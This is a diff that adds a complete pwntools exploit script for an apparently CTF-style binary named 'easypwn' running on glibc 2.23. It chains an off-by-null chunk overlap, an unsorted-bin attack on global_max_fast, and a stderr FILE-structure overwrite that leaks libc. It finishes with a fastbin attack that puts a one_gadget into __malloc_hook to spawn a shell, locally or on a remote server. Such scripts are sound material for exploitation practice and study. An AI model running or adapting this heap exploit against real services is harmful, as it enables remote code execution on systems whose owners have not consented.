@@ -1,0 +1,188 @@
+#!/usr/bin/env python3
+#-*- coding:utf-8 -*-
+# author: i0gan
+# env: pwndocker [skysider/pwndocker (v: 2020/09/09)]
+
+from pwn import *
+import os
+
+r   =  lambda x : io.recv(x)
+ra  =  lambda   : io.recvall()
+rl  =  lambda   : io.recvline(keepends = True)
+ru  =  lambda x : io.recvuntil(x, drop = True)
+s   =  lambda x : io.send(x)
+sl  =  lambda x : io.sendline(x)
+sa  =  lambda x, y : io.sendafter(x, y)
+sla =  lambda x, y : io.sendlineafter(x, y)
+ia  =  lambda : io.interactive()
+c   =  lambda : io.close()
+li    = lambda x : log.info('\x1b[01;38;5;214m' + x + '\x1b[0m')
+
+
+context.log_level='debug'
+
+elf_path  = './easypwn'
+MODIFY_LD = 0
+arch = '64'
+libc_v = '2.23'
+
+ld_path   = '/glibc/' + libc_v + '/' + arch + '/lib/ld-linux-x86-64.so.2'
+libs_path = '/glibc/' + libc_v + '/' + arch + '/lib'
+libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
+#libc_path = './libc.so.6'
+#libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
+libc_path = '/glibc/' + libc_v + '/' + arch + '/lib/libc.so.6'
+
+# change ld path 
+if(MODIFY_LD):
+	os.system('cp ' + elf_path + ' ' + elf_path + '.bk')
+	change_ld_cmd = 'patchelf  --set-interpreter ' + ld_path +' ' + elf_path
+	os.system(change_ld_cmd)
+	li('modify ld ok!')
+	exit(0)
+
+# remote server ip and port
+server_ip = "0.0.0.0"
+server_port = 0
+
+# if local debug
+LOCAL = 1
+LIBC  = 1
+
+#--------------------------func-----------------------------
+def db():
+	if(LOCAL):
+		gdb.attach(io)
+
+def ad(size):
+	sla(':', str(1))
+	sla(':', str(size))
+
+def rm(idx):
+	sla(':', str(3))
+	sla(':', str(idx))
+
+def md(idx, data):
+	sla(':', str(2))
+	sla(':', str(idx))
+	sa(':', data)
+
+def q():
+	sla(':', str(5))	
+
+#--------------------------exploit--------------------------
+def exploit():
+	li('exploit...')
+	ad(0x68) # idx 0
+	ad(0x88) # idx 1
+	ad(0x68) # idx 2 f
+	ad(0xf8) # idx 3
+	ad(0x68) # idx 4 f
+
+	# for second attack
+	ad(0x68) # idx 5
+	ad(0x88) # idx 6
+	ad(0x68) # idx 7 f
+	ad(0xf8) # idx 8
+	ad(0x68) # idx 9 f
+
+	ad(0x68) # idx 10 f
+
+	rm(1)
+	md(2, b'A' * 0x60 + p64(0x100)) #off by null set top chunk pre_inuse bit  as null
+	# make chunk 3 merge to chunk 1
+	rm(3)
+	ad(0x88) # idx 1
+	ad(0x68) # idx 3, replace chunk 2, two ptr pointer to same memory
+	# modify global_max_fast to make a condition for fastbin attack	
+	ad(0x68) # idx 11 -> old chunk 3 
+	ad(0x88) # idx 12 -> old chunk 3
+
+	
+	rm(6)
+	md(7, b'A' * 0x60 + p64(0x100))
+	rm(8)  # make chunk 8 merget to chunk 6
+	ad(0x88) # idx 6 -> old chunk  6
+	ad(0x68) # idx 8 -> old chunk 7
+	ad(0xf8) # idx 13 -> old chunk 8
+	
+	# modify global_max_fast = 0x7f
+	rm(5) #
+	rm(3) # -> old chunk 2
+	# make bd pointer to main_arena + 8 (global_max_fast - 0x10)
+	# 0x7ffff7dd37f8 <global_max_fast>:       0x0000000000000010      0x0000000000000000
+	md(2, p64(0) + b'\x38\x38\n')
+	#db()
+	ad(0x68) # idx 3
+	ad(0x68) # idx 5
+	# unsorted bin attack to modify global_max_fast value as big number(main_arena + 0x58)
+	rm(3)
+	
+	# stage 2
+	rm(11) # -> old chunk 3, for cleanning fastbin
+	rm(7)  #
+	md(8, '\x00\n') # -> chunk 7, make fd -> chunk 2
+	md(2, '\xdd\x25\n')
+	
+	ad(0x68) # idx 3 for ajust
+	ad(0x68) # idx 7 for ajust
+	# attack to _IO_2_1_stderr + 157 to leak libc
+	ad(0x68) # idx 11
+	p = b'\x11' * 0x33
+	p += p64(0xfbad3887)
+	p += p64(0) * 3
+	p += b'\x40\n'
+	md(11, p)
+	leak = u64(ru('\x7f')[-5:] + b'\x7f\x00\x00')
+	libc_base = leak - (0x7ffff7fc2640 - 0x7ffff7c26000)
+	li('leak: ' + hex(leak))
+	li('libc_base: ' + hex(libc_base))
+
+	libc.address = libc_base
+	one_gadget = libc_base + 0x3f42a
+
+	# fastbin attack to malloc_hook - 0x23
+	rm(2)
+	rm(10)
+	rm(5)
+
+	ad(0x68) # idx 2
+	md(2, p64(libc.sym['__malloc_hook'] - 0x23) + p64(0) + b'\n')
+
+	ad(0x68) # idx 5
+	ad(0x68) # idx 10
+	ad(0x68) # idx 14
+
+	p = b'\x00' * (0x13 - 8)
+	p += p64(one_gadget)
+	p += p64(libc.sym['realloc'] + 8)
+	p += b'\n'
+	md(14, p)
+
+	# get shell
+	ad(0x10)
+	
+
+def finish():
+	ia()
+	c()
+
+#--------------------------main-----------------------------
+if __name__ == '__main__':
+	
+	if LOCAL:
+		elf = ELF(elf_path)
+		if LIBC:
+			libc = ELF(libc_path)
+			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path, "LD_PRELOAD" : libc_path} )
+		else:
+			io = elf.process(env = {"LD_LIBRARY_PATH" : libs_path} )
+	
+	else:
+		elf = ELF(elf_path)
+		io = remote(server_ip, server_port)
+		if LIBC:
+			libc = ELF(libc_path)
+
+	exploit()
+	finish()
